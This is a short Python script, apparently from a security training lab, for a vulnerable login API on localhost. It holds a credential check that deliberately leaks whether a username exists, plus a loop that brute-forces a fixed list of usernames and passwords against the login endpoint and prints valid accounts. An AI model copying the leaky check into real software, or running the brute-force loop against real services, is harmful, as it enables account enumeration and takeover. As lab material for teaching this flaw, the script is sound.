import requests

def error_message_helper(message):
    return {"message": message}

def check_credentials(vuln, request_data, user):
    user_error_message = "Username does not exist"
    password_error_message = "Password is not correct for the given username."
    
    users_list = ["name1", "name2", "name3", "name4", "name5", "admin"]
    pass_list = ["pass1", "pass2", "pass3", "pass4", "pass5", "admin"]

    if vuln:  # Password Enumeration
        if user and request_data.get('password') != user.password:
            return error_message_helper(password_error_message)
        elif not user:  # User enumeration
            return error_message_helper(user_error_message)
    else:
        if (user and request_data.get('password') != user.password) or (not user):
            return error_message_helper(password_error_message + " Week2 Completed")

    return None

def enumerate_users():
    users_list = ["name1", "name2", "name3", "name4", "name5", "admin"]
    pass_list = ["pass1", "pass2", "pass3", "pass4", "pass5", "admin"]
    password_error_message = "Password is not correct for the given username."

    for user in users_list:
        for password in pass_list:
            data = {
                "username": user,
                "password": password
            }
            response = requests.post("http://localhost:5000/users/v1/login", json=data)
            try:
                body = response.json()
            except ValueError:
                print(f"Failed to decode JSON for user {user} with password {password}. Response content: {response.text}")
                continue

            if body.get("message") == password_error_message:
                print(f"User {user} does exist, checking passwords")
            elif body.get("message") == "Successfully logged in.":
                print(f"Found {user} with password {password}")
            else:
                break

# Example usage
if __name__ == "__main__":
    request_data = {"username": "admin", "password": "pass1"}
    user = None  # Replace with actual user fetching logic
    vuln = True

    response = check_credentials(vuln, request_data, user)
    if response:
        print(response)  # Print the dictionary directly
    else:
        enumerate_users()
